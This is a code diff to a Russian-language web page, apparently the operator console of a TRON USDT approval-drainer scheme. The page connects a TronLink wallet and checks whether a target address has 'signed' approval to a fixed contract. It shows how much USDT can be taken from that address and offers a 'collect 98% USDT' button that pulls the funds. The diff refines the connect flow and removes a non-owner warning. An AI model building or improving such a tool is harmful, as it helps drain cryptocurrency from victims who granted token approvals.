@@ -19,7 +19,6 @@
             line-height: 1.6; min-height: 100vh;
         }
 
-        /* Header */
         .header {
             background: var(--bg-card); border-bottom: 1px solid var(--border);
             padding: 1rem 2rem; position: sticky; top: 0; z-index: 100;
@@ -52,12 +51,10 @@
         }
         .wallet-address { font-family: monospace; font-size: 0.85rem; }
 
-        /* Main Container */
         .container {
             max-width: 1200px; margin: 0 auto; padding: 2rem;
         }
 
-        /* Connection Warning */
         .connect-warning {
             background: linear-gradient(135deg, rgba(255, 71, 87, 0.1) 0%, rgba(255, 165, 0, 0.1) 100%);
             border: 1px solid var(--error); border-radius: 16px;
@@ -65,16 +62,24 @@
         }
         .connect-warning h2 { color: var(--error); margin-bottom: 1rem; }
         .connect-warning p { color: var(--text-secondary); margin-bottom: 1.5rem; }
+
         .btn-primary {
             background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
             color: white; border: none; padding: 1rem 2rem;
             border-radius: 12px; font-weight: 600; cursor: pointer;
             font-size: 1rem; transition: transform 0.2s, box-shadow 0.2s;
+            display: inline-flex; align-items: center; gap: 0.5rem;
         }
         .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(51, 117, 187, 0.3); }
         .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
 
-        /* Stats Grid */
+        .spinner {
+            width: 20px; height: 20px; border: 2px solid transparent;
+            border-top-color: white; border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
         .stats-grid {
             display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
             gap: 1.5rem; margin-bottom: 2rem;
@@ -93,7 +98,6 @@
         }
         .stat-value.zero { color: var(--text-secondary); }
 
-        /* Main Card */
         .main-card {
             background: var(--bg-card); border: 1px solid var(--border);
             border-radius: 16px; padding: 2rem; margin-bottom: 2rem;
@@ -103,7 +107,6 @@
             display: flex; align-items: center; gap: 0.5rem;
         }
 
-        /* Form Elements */
         .form-group { margin-bottom: 1.5rem; }
         .form-group label {
             display: block; margin-bottom: 0.5rem;
@@ -127,7 +130,6 @@
         }
         .btn-icon:hover { background: var(--primary-dark); }
 
-        /* User Info Display */
         .user-info {
             background: var(--bg-hover); border: 1px solid var(--border);
             border-radius: 12px; padding: 1.5rem; margin-top: 1.5rem;
@@ -156,7 +158,6 @@
         .badge-error { background: rgba(255, 71, 87, 0.2); color: var(--error); }
         .badge-warning { background: rgba(255, 165, 0, 0.2); color: var(--warning); }
 
-        /* Action Button */
         .action-section {
             margin-top: 2rem; padding-top: 2rem;
             border-top: 1px solid var(--border);
@@ -177,7 +178,6 @@
             background: var(--bg-hover);
         }
 
-        /* Status Messages */
         .status-message {
             padding: 1rem 1.25rem; border-radius: 12px;
             margin-top: 1rem; display: none; align-items: center; gap: 0.75rem;
@@ -193,15 +193,6 @@
             background: rgba(51, 117, 187, 0.1); border: 1px solid var(--primary); color: var(--primary);
         }
 
-        /* Loading Spinner */
-        .spinner {
-            width: 20px; height: 20px; border: 2px solid transparent;
-            border-top-color: currentColor; border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        /* Transaction Link */
         .tx-link {
             color: var(--primary); text-decoration: none;
             font-family: monospace; font-size: 0.875rem;
@@ -209,7 +200,6 @@
         }
         .tx-link:hover { text-decoration: underline; }
 
-        /* Instructions */
         .instructions {
             background: var(--bg-hover); border-left: 4px solid var(--primary);
             padding: 1.25rem; border-radius: 0 12px 12px 0;
@@ -219,7 +209,6 @@
         .instructions ul { margin-left: 1.25rem; color: var(--text-secondary); }
         .instructions li { margin-bottom: 0.5rem; }
 
-        /* Contract Info */
         .contract-info {
             background: rgba(51, 117, 187, 0.05); border: 1px solid var(--border);
             border-radius: 12px; padding: 1rem; margin-bottom: 2rem;
@@ -233,7 +222,20 @@
             font-size: 0.875rem; word-break: break-all;
         }
 
-        /* Responsive */
+        /* Добавлено: стили для экрана загрузки */
+        .loading-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: var(--bg-dark); z-index: 9999;
+            display: flex; flex-direction: column; align-items: center;
+            justify-content: center; gap: 1.5rem;
+        }
+        .loading-overlay.hidden { display: none; }
+        .loading-spinner-large {
+            width: 50px; height: 50px; border: 3px solid var(--border);
+            border-top-color: var(--primary); border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
         @media (max-width: 768px) {
             .header { padding: 1rem; flex-direction: column; gap: 1rem; }
             .container { padding: 1rem; }
@@ -243,6 +245,14 @@
     </style>
 </head>
 <body>
+    <!-- Loading Screen -->
+    <div class="loading-overlay" id="loadingScreen">
+        <div class="logo-icon" style="width: 60px; height: 60px; font-size: 1.5rem;">💰</div>
+        <div style="font-size: 1.25rem; font-weight: 600;">Панель Продавца</div>
+        <div class="loading-spinner-large"></div>
+        <div style="color: var(--text-secondary);" id="loadingText">Инициализация...</div>
+    </div>
+
     <header class="header">
         <div class="logo">
             <div class="logo-icon">💰</div>
@@ -263,24 +273,20 @@
             <h2>⚠️ Требуется подключение кошелька</h2>
             <p>Для работы с панелью продавца необходимо подключить TronLink</p>
             <button class="btn-primary" onclick="connectWallet()" id="connectBtn">
-                Подключить TronLink
+                <span id="btnText">Подключить TronLink</span>
             </button>
         </div>
 
-        <!-- Main Content (hidden until connected) -->
+        <!-- Main Content -->
         <div id="mainContent" style="display: none;">
 
-            <!-- Contract Info -->
             <div class="contract-info">
                 <div>
                     <div class="contract-label">Адрес контракта:</div>
                 </div>
-                <div class="contract-address" id="contractAddressDisplay">
-                    TPMZSSoFuoN3Krqn2j1qaJzQVQN3mWXEvk
-                </div>
+                <div class="contract-address">TPMZSSoFuoN3Krqn2j1qaJzQVQN3mWXEvk</div>
             </div>
 
-            <!-- Instructions -->
             <div class="instructions">
                 <h4>📋 Инструкция по работе:</h4>
                 <ul>
@@ -291,7 +297,6 @@
                 </ul>
             </div>
 
-            <!-- Stats -->
             <div class="stats-grid">
                 <div class="stat-card">
                     <h3>Всего собрано</h3>
@@ -309,7 +314,6 @@
                 </div>
             </div>
 
-            <!-- Main Action Card -->
             <div class="main-card">
                 <h2>🔍 Проверка и сбор средств</h2>
 
@@ -322,7 +326,7 @@
                 </div>
 
                 <div class="form-group">
-                    <label>Адрес USDT контракта (обычно не меняется)</label>
+                    <label>Адрес USDT контракта</label>
                     <div class="input-group">
                         <input type="text" id="usdtAddress" value="TFNJbhLpxBmU393Rqd9Ggjgx9eoBsNLqhb">
                         <button class="btn-icon" onclick="resetUsdt()" title="Сбросить">↺</button>
@@ -333,7 +337,6 @@
                     <span id="checkBtnText">Проверить пользователя</span>
                 </button>
 
-                <!-- User Info Display -->
                 <div class="user-info" id="userInfo">
                     <div class="info-row">
                         <span class="info-label">Статус подписи:</span>
@@ -355,7 +358,6 @@
                     </div>
                 </div>
 
-                <!-- Collect Section -->
                 <div class="action-section" id="collectSection" style="display: none;">
                     <button class="btn-collect" onclick="collectFunds()" id="collectBtn">
                         💸 Собрать 98% USDT
@@ -364,7 +366,6 @@
                 </div>
             </div>
 
-            <!-- Recent Activity -->
             <div class="main-card">
                 <h2>📊 Недавняя активность</h2>
                 <div id="activityList" style="color: var(--text-secondary); text-align: center; padding: 2rem;">
@@ -376,7 +377,6 @@
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script>
-        // НОВЫЙ АДРЕС КОНТРАКТА
         const CONTRACT_ADDRESS = 'TPMZSSoFuoN3Krqn2j1qaJzQVQN3mWXEvk';
         const DEFAULT_USDT = 'TFNJbhLpxBmU393Rqd9Ggjgx9eoBsNLqhb';
 
@@ -391,32 +391,75 @@
         let tronWeb, contract, userAddress, contractOwner;
         let currentUserData = null;
 
-        // Инициализация
-        async function init() {
-            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                await connectWallet();
+        // Инициализация при загрузке
+        window.addEventListener('load', async () => {
+            // Проверяем, есть ли TronLink
+            if (window.tronWeb && window.tronWeb.ready) {
+                // Уже подключен
+                await initApp();
+            } else {
+                // Показываем экран подключения
+                document.getElementById('loadingScreen').classList.add('hidden');
             }
-        }
+        });
 
-        // Подключение кошелька
+        // Запрос на подключение кошелька
         async function connectWallet() {
-            const connectBtn = document.getElementById('connectBtn');
-            connectBtn.disabled = true;
-            connectBtn.innerHTML = '<div class="spinner" style="border-top-color: white;"></div> Подключение...';
+            const btn = document.getElementById('connectBtn');
+            const btnText = document.getElementById('btnText');
+
+            btn.disabled = true;
+            btnText.innerHTML = '<div class="spinner"></div> Подключение...';
 
             try {
                 if (!window.tronWeb) {
-                    throw new Error('TronLink не установлен. Установите расширение TronLink для браузера.');
+                    throw new Error('TronLink не установлен. Установите расширение или откройте в TronLink app');
                 }
 
+                // ВАЖНО: Запрашиваем доступ к аккаунту (это вызывает popup авторизации)
+                const res = await window.tronWeb.requestAccounts();
+                console.log('requestAccounts result:', res);
+
+                // Теперь инициализируем
+                await initApp();
+
+            } catch (error) {
+                console.error('Connection error:', error);
+                btn.disabled = false;
+                btnText.textContent = 'Подключить TronLink';
+
+                let msg = error.message || 'Ошибка подключения';
+                if (msg.includes('User rejected')) {
+                    msg = 'Вы отклонили запрос на подключение. Нажмите кнопку снова и подтвердите в TronLink.';
+                } else if (msg.includes('401')) {
+                    msg = 'Доступ запрещен. Пожалуйста, разблокируйте TronLink и попробуйте снова.';
+                }
+
+                alert(msg);
+            }
+        }
+
+        // Инициализация приложения
+        async function initApp() {
+            try {
                 tronWeb = window.tronWeb;
+
+                // Проверяем, что адрес доступен
+                if (!tronWeb.defaultAddress || !tronWeb.defaultAddress.base58) {
+                    throw new Error('Адрес недоступен. Разблокируйте TronLink.');
+                }
+
                 userAddress = tronWeb.defaultAddress.base58;
 
                 // Инициализация контракта
-                contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+                contract = tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
 
                 // Проверка владельца
-                contractOwner = await contract.owner().call();
+                try {
+                    contractOwner = await contract.owner().call();
+                } catch (e) {
+                    console.log('Owner check failed:', e);
+                }
 
                 // Обновление UI
                 document.getElementById('walletStatus').classList.add('connected');
@@ -425,40 +468,29 @@
 
                 document.getElementById('connectWarning').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'block';
-
-                // Проверка прав
-                if (contractOwner !== userAddress) {
-                    showStatus('collectStatus', 
-                        '⚠️ Внимание: вы не являетесь владельцем контракта. Некоторые функции могут быть недоступны.', 
-                        'error');
-                    document.getElementById('collectSection').style.display = 'block';
-                }
+                document.getElementById('loadingScreen').classList.add('hidden');
 
                 loadStats();
 
             } catch (error) {
-                connectBtn.disabled = false;
-                connectBtn.innerHTML = 'Подключить TronLink';
-                alert('Ошибка подключения: ' + error.message);
+                console.error('Init error:', error);
+                alert('Ошибка инициализации: ' + error.message);
             }
         }
 
-        // Вставка адреса из буфера
         async function pasteAddress() {
             try {
                 const text = await navigator.clipboard.readText();
                 document.getElementById('userAddress').value = text.trim();
             } catch (err) {
-                console.log('Не удалось прочитать буфер обмена');
+                console.log('Clipboard error:', err);
             }
         }
 
-        // Сброс USDT адреса
         function resetUsdt() {
             document.getElementById('usdtAddress').value = DEFAULT_USDT;
         }
 
-        // Проверка пользователя
         async function checkUser() {
             const user = document.getElementById('userAddress').value.trim();
             const usdt = document.getElementById('usdtAddress').value.trim();
@@ -474,36 +506,25 @@
             document.getElementById('checkBtnText').innerHTML = '<div class="spinner"></div> Проверка...';
 
             try {
-                // Проверка подписи
                 const approved = await contract.approved(user).call();
                 const collected = await contract.collected(user).call();
 
-                // Обновление статуса подписи
                 const signStatusEl = document.getElementById('signStatus');
-                if (approved) {
-                    signStatusEl.innerHTML = '<span class="badge badge-success">✅ Подписано</span>';
-                } else {
-                    signStatusEl.innerHTML = '<span class="badge badge-error">❌ Не подписано</span>';
-                }
+                signStatusEl.innerHTML = approved 
+                    ? '<span class="badge badge-success">✅ Подписано</span>'
+                    : '<span class="badge badge-error">❌ Не подписано</span>';
 
-                // Обновление статуса сбора
                 const collectStatusEl = document.getElementById('collectStatusBadge');
-                if (collected) {
-                    collectStatusEl.innerHTML = '<span class="badge badge-success">✅ Да</span>';
-                } else {
-                    collectStatusEl.innerHTML = '<span class="badge badge-warning">⏳ Нет</span>';
-                }
+                collectStatusEl.innerHTML = collected
+                    ? '<span class="badge badge-success">✅ Да</span>'
+                    : '<span class="badge badge-warning">⏳ Нет</span>';
 
-                // Проверка суммы
                 const amount = await contract.checkCollectable(user, usdt).call();
                 const amountFormatted = (amount / 1e6).toFixed(2);
 
                 document.getElementById('availableAmount').textContent = amountFormatted + ' USDT';
-
-                // Показать информацию
                 userInfo.classList.add('visible');
 
-                // Показать кнопку сбора если есть сумма и не собрано
                 if (amount > 0 && !collected && approved) {
                     document.getElementById('collectSection').style.display = 'block';
                     currentUserData = { user, usdt, amount: amountFormatted };
@@ -531,7 +552,6 @@
             }
         }
 
-        // Сбор средств
         async function collectFunds() {
             if (!currentUserData) return;
 
@@ -547,7 +567,6 @@
                     callValue: 0
                 });
 
-                // Успех
                 showStatus('collectStatus', 
                     `✅ Успешно! Транзакция: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" class="tx-link">${tx.slice(0, 20)}...</a>`, 
                     'success');
@@ -555,11 +574,9 @@
                 btn.innerHTML = '✅ Сбор выполнен';
                 btn.style.background = 'var(--success)';
 
-                // Обновить статистику
                 addActivity(user, currentUserData.amount, tx);
                 updateTotalCollected(parseFloat(currentUserData.amount));
 
-                // Скрыть секцию сбора
                 setTimeout(() => {
                     document.getElementById('collectSection').style.display = 'none';
                     document.getElementById('userInfo').classList.remove('visible');
@@ -578,21 +595,18 @@
             }
         }
 
-        // Показать статусное сообщение
         function showStatus(elementId, message, type) {
             const el = document.getElementById(elementId);
             el.className = 'status-message ' + type + ' visible';
             el.innerHTML = message;
         }
 
-        // Статистика (localStorage)
         function loadStats() {
             const total = localStorage.getItem('totalCollected') || '0';
             const today = localStorage.getItem('checksToday') || '0';
             document.getElementById('totalCollected').textContent = parseFloat(total).toFixed(2) + ' USDT';
             document.getElementById('checksToday').textContent = today;
 
-            // Сброс счетчика если новый день
             const lastDate = localStorage.getItem('lastCheckDate');
             const todayDate = new Date().toDateString();
             if (lastDate !== todayDate) {
@@ -610,7 +624,7 @@
 
         function updateTotalCollected(amount) {
             let total = parseFloat(localStorage.getItem('totalCollected') || '0');
-            total += amount * 0.98; // 98% идет продавцу
+            total += amount * 0.98;
             localStorage.setItem('totalCollected', total.toString());
             document.getElementById('totalCollected').textContent = total.toFixed(2) + ' USDT';
         }
@@ -639,16 +653,6 @@
 
             list.insertBefore(item, list.firstChild);
         }
-
-        // Авто-инициализация
-        window.addEventListener('load', init);
-
-        // Проверка изменения аккаунта
-        setInterval(() => {
-            if (window.tronWeb && window.tronWeb.defaultAddress.base58 !== userAddress) {
-                window.location.reload();
-            }
-        }, 3000);
     </script>
 </body>
 </html>
